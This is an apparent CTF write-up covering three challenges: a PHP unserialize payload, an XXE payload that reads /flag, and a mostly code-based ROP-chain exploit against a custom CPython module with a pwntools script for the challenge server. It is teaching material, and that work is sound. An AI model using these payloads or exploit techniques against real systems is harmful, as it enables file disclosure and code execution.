# web

## PHP

```php
<?php

$line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = @unserialize($line);

throw new Exception('Well that was unexpected…');

echo $a;
```

Okay, so it's a classical unserialize vulnerability. The problem for us is to destory it before PHP *Exception*. 
I added an attribute in my serialize object...and it works...

Here it is:
```php
O:1:"B":0:{"b":0}
```

# rev

## juggle

Not a *rev* challenge actually. It's a XLST injection which looks more web...

The expected solution seems require us to inject the file and change amount of data. But actually we can use a simple payload
to read *flag*:
```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
```

# pwn

## collection

Even though this is the easiest one, but I still want to say super hard. The challenge provides a special cpython lib. It has seccomp
rule and some customized list. 

Seccomp rule:
```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0012
 0011: 0x05 0x00 0x00 0x00000011  goto 0029
 0012: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000019  if (A != mremap) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000ca  if (A != futex) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000083  if (A != sigaltstack) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0026
 0025: 0x05 0x00 0x00 0x00000037  goto 0081
 0026: 0x15 0x00 0x01 0x0000000d  if (A != rt_sigaction) goto 0028
 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0028: 0x06 0x00 0x00 0x00000000  return KILL
 0029: 0x05 0x00 0x00 0x00000000  goto 0030
 0030: 0x20 0x00 0x00 0x00000010  A = args[0]
 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0032: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0034: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0038
 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0036: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0039
 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0038: 0x06 0x00 0x00 0x00000000  return KILL
 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0040: 0x20 0x00 0x00 0x00000020  A = args[2]
 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0042: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0044: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0048
 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0046: 0x15 0x02 0x00 0x00000003  if (A == 0x3) goto 0049
 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0048: 0x06 0x00 0x00 0x00000000  return KILL
 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0050: 0x20 0x00 0x00 0x00000028  A = args[3]
 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] >> 32
 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0054: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0058
 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0056: 0x15 0x02 0x00 0x00000022  if (A == 0x22) goto 0059
 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0058: 0x06 0x00 0x00 0x00000000  return KILL
 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0060: 0x20 0x00 0x00 0x00000030  A = args[4]
 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0062: 0x20 0x00 0x00 0x00000034  A = args[4] >> 32
 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0064: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0068
 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0066: 0x15 0x02 0x00 0xffffffff  if (A == 0xffffffff) goto 0069
 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0068: 0x06 0x00 0x00 0x00000000  return KILL
 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0070: 0x20 0x00 0x00 0x00000038  A = args[5]
 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] >> 32
 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0074: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0078
 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0076: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0079
 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0078: 0x06 0x00 0x00 0x00000000  return KILL
 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0080: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0081: 0x05 0x00 0x00 0x00000000  goto 0082
 0082: 0x20 0x00 0x00 0x00000010  A = args[0]
 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0084: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0086: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0092
 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0088: 0x15 0x00 0x02 0x00000001  if (A != 0x1) goto 0091
 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0090: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0091: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0092: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0098
 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0094: 0x15 0x00 0x02 0x00000002  if (A != 0x2) goto 0097
 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0096: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0098: 0x06 0x00 0x00 0x00000000  return KILL
 ```
 
 > Notice that we cannot get seccomp rule by directly using the lib as our `--file` parameter. We should create a python file which 
 calls the function in `Collection` instead and use that script as out `--file` parameter
 
 At the very begining, I can easily trigger crash via this script (I just want to test some functions in Collection...and it just
 crashed...wonderful):
 ```python
 #!/usr/bin/python3

from sys import modules
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
for k in keys:
    if  k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]

a = Collection.Collection({
    "a" : [1337,2,3,4,5,6],
    "b": [10]
    })

print(a.get("a"))
print(a.get("a").index(2))
print(a.get("b").get(1))
 ```
 
But the problem is that we cannot pivot the stack or called `one_gadget`, which is annoying. 

My teammate finally figured out the pivot but it's too late:
```python
from sys import modules
import os
input()
flag = open("flag", "r")
os.dup2(flag.fileno(), 1023)
flag.close()

del modules['os']
import Collection
"""
keys = list(__builtins__.__dict__.keys())
# print(keys)
for k in keys:
	if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
		del __builtins__.__dict__[k]
"""
p64 = lambda x: x.to_bytes(8,"little")

a = Collection.Collection({
	"a":[0x100],
	"b":[2e-100]
})

# leak libc
base_address = id(print)-0x5daf78-0xa000
base_module = id(Collection.Collection)-0x2041e0

# readv = 0x4208b0
# write = 0x4207e0
# pop_rdi = 0x421612 # pop rdi; ret
# pop_rsi = 0x42110e # pop rsi; ret
# pop_rdx = 0x4026c1 # pop rdx; ret
# puts = base_address + 0x809c0
print("libc base: " + hex(base_address))
print("Collection base: " + hex(base_module))

SYSCALL = base_address + 0x00000000000d2975

payload = p64(0x00000000004299a8) +p64(0)
payload += p64(0x0000000000627751)
payload += p64(0x9b3ef0)
payload += p64(0x100)
payload += p64(0x9b3ef0)
payload += p64(0x9b3ef0)
payload += p64(0x6cdfc0) # PyInit_posix, doesn't do anything for now
s = b'd'*16


# 0x0000000000523df2
buf = id(payload)
print("payload addr: "+hex(id(payload)))
print("bytes[] addr: "+hex(buf))
print(a.get('b'))

a.get('a').insert(1, s)
a.get('a').insert(1, payload)

POPRAX = 0x0000000000420f7b
POPRDI = 0x0000000000421612
POPRSI = 0x000000000042110e
POPRDX = 0x00000000004026c1


payload = payload[:-8]
payload += p64(0x000000000042a54a)
payload += p64(0x0000000000467123)
payload += p64(0xdeadbeef)
payload += p64(0x9b3ef0)
payload += p64(0xcafebabe)

payload += p64(POPRAX)
payload += p64(19)
payload += p64(POPRDI)
payload += p64(1023)
payload += p64(POPRSI)
payload += p64(buf + 0x38)
payload += p64(POPRDX)
payload += p64(2)
payload += p64(SYSCALL)

payload += p64(POPRAX)
payload += p64(1)
payload += p64(POPRDI)
payload += p64(1)
payload += p64(POPRSI)
payload += p64(0x9b3ef0)
payload += p64(POPRDX)
payload += p64(100)
payload += p64(SYSCALL)
#payload += b'c'*300

a.get('a').insert(1, s)
a.get('a').insert(1, payload)
input()
print(a.get('a'))
#.index(0x100))
END_OF_PWN
```

And a helper script:
```python
#!/usr/bin/python

from pwn import *
from subprocess import check_output as co

# 35C3_l1st_equiv4lency_is_n0t_l15t_equ4l1ty

f = open("test.py",'r')

if len(sys.argv) < 2:
	r = process(["/usr/bin/python2.7","server.py"])
	gdb.attach(r,"""
		catch exec
		c
		c
		b *0x42a54a
		c
	""")
	r.sendline(f.read())
	r.interactive()
else:
	r = remote("35.207.157.79",4444)
	r.recvuntil("challenge: ")
	prooftitle = r.recvline(False)
	log.info("acquiring POW solution")
	s = co(["./pow.py","{}".format(prooftitle)])
	solution = s.split('\n')[-2].split(": ")[-1]
	log.info("solution: {}".format(solution))
	r.sendlineafter("response? ",solution)
	payload = f.read().replace("-0x5000","+0x12000")
	r.send(payload)
	r.recvuntil("[768]")
	r.recvline(False)
	flag = r.recv(64)
	log.info(flag)
	r.close()

f.close()
```
